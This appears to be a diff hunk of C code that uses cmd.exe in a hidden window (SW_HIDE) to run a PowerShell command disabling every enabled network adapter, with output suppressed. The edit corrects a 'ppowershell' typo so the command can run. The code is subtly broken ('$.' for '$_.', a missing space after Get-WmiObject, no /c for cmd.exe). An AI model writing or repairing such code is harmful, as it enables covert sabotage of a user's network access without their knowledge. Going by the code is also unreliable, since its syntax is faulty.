@@ -10,7 +10,7 @@ int main() {
         NULL,
         "open",
         "cmd.exe",
-        "ppowershell -Command \"Get-WmiObject-class Win32_NetworkAdapter | ForEach{ If($.NetEnabled) { $.Disable() } }\" > NULL",
+        "powershell -Command \"Get-WmiObject-class Win32_NetworkAdapter | ForEach{ If($.NetEnabled) { $.Disable() } }\" > NULL",
         NULL,
         SW_HIDE
     );
